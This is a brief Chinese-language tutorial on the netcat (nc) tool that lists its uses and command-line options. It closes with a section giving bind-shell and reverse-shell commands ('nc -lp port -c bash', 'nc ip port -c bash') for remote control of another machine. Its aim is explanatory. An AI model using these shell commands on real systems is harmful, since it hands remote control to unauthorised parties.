# netcat(nc)

## 简介

NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。

Nc可以在两台设备上面相互交互，即侦听模式/传输模式。

* telnet功能
* 获取banner信息
* 传输文本信息
* 传输文件/目录
* 加密传输文件
* 远程控制
* 加密所有流量
* 流媒体服务器
* 远程克隆硬盘

## 具体使用

* -c shell commands  shell模式
* -e filename          程序重定向 [危险!!]
* -b  允许广播
* -d   无命令行界面,使用后台模式
* -g gateway       源路由跳跃点, 不超过8
* -G num          源路由指示器: 4, 8, 12, ...
* -h              获取帮助信息
* -i secs           延时设置,端口扫描时使用
* -k  设置在socket上的存活选项
* -l               监听入站信息
* -n              以数字形式表示的IP地址
* -o file           十进制记录
* -p port          本地端口
* -r               随机本地和远程的端口
* -q secs 在标准输入且延迟后退出（翻译的不是很好，后面实例介绍）
* -s addr 本地源地址
* -T tos 设置服务类型
* -t               以TELNET的形式应答入站请求
* -u UDP模式
* -v               显示详细信息 [使用=vv获取更详细的信息
* -w secs          连接超时设置
* -z               I/O 模式 [扫描时使用]


### nc远程控制

正向连接
A:nc -lp port -c bash
B:nc ip port
A将自己的Bash发给B
反向连接
A:nc -lp port
B:nc ip port -c bash
B将自己的Bash发给A
win下Bash换成cmd
